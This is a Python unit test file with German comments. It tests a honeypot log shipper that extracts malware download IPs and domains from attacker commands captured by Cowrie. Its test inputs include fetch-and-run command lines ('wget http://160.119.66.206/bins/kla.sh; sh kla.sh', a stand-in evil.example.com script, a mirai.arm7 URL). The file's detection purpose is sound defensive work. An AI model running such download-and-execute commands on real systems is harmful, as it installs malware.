#!/usr/bin/env python3
"""Tests der Cowrie-Nachlade-Parser im Shipper: Download-Hosts, die bare Public-IPs
sind, werden als malware_host-Agent-Event extrahiert; echte Domains bleiben beim
Domain-Pfad; nachgeschobene Payload-Dateinamen (sh kla.sh) sind keine Domains.

Lauf: python -m unittest discover -s tests   (aus dem Repo-Root)
"""

import importlib.util
import json
import os
import unittest

_HERE = os.path.dirname(__file__)
_SHIPPER = os.path.join(_HERE, "..", "shipper", "shipper.py")
_spec = importlib.util.spec_from_file_location("shipper", _SHIPPER)
shipper = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(shipper)


def cmd(inp, ip="1.2.3.4"):
    return json.dumps({"eventid": "cowrie.command.input", "src_ip": ip,
                       "timestamp": "2026-11-22T10:00:00Z", "input": inp})


class MalwareIps(unittest.TestCase):
    def test_bare_ip_host_extracted(self):
        ev = shipper.parse_cowrie_malware_ips(
            cmd("cd /tmp; wget http://160.119.66.206/bins/kla.sh; sh kla.sh"))
        self.assertEqual(len(ev), 1)
        self.assertEqual(ev[0]["src_ip"], "160.119.66.206")
        self.assertEqual(ev[0]["reason"], "malware_host")
        self.assertEqual(ev[0]["app"], "honeypot")
        self.assertTrue(ev[0]["path"].startswith("http://160.119.66.206/"))

    def test_file_download_url(self):
        line = json.dumps({"eventid": "cowrie.session.file_download", "src_ip": "5.6.7.8",
                           "timestamp": "t", "url": "http://45.9.148.99/mirai.arm7"})
        ev = shipper.parse_cowrie_malware_ips(line)
        self.assertEqual(ev[0]["src_ip"], "45.9.148.99")

    def test_private_host_still_emitted_intake_filters(self):
        # Der Shipper extrahiert auch private Hosts; die Intake markiert is_private
        # (netguard) und schliesst sie vom Publish aus. Hier nur: wird erkannt.
        ev = shipper.parse_cowrie_malware_ips(cmd("wget http://192.168.1.50/x"))
        self.assertEqual(ev[0]["src_ip"], "192.168.1.50")

    def test_domain_download_is_not_malware_ip(self):
        self.assertIsNone(shipper.parse_cowrie_malware_ips(
            cmd("wget http://evil.example.com/a.sh")))

    def test_dedup_same_ip(self):
        ev = shipper.parse_cowrie_malware_ips(
            cmd("wget http://8.8.4.4/a; curl http://8.8.4.4/b"))
        self.assertEqual(len(ev), 1)


class DomainFalsePositives(unittest.TestCase):
    def test_script_filename_not_a_domain(self):
        # "sh kla.sh" nach dem Download darf nicht als Domain kla.sh durchgehen.
        self.assertIsNone(shipper.parse_cowrie_domains(
            cmd("wget http://160.119.66.206/bins/kla.sh; sh kla.sh")))

    def test_real_domain_still_extracted(self):
        ev = shipper.parse_cowrie_domains(cmd("wget http://evil.example.com/a.sh"))
        self.assertEqual(ev[0]["domain"], "evil.example.com")

    def test_bare_host_without_scheme(self):
        ev = shipper.parse_cowrie_domains(cmd("wget malhost.ru/x; sh x"))
        self.assertEqual(ev[0]["domain"], "malhost.ru")


if __name__ == "__main__":
    unittest.main()
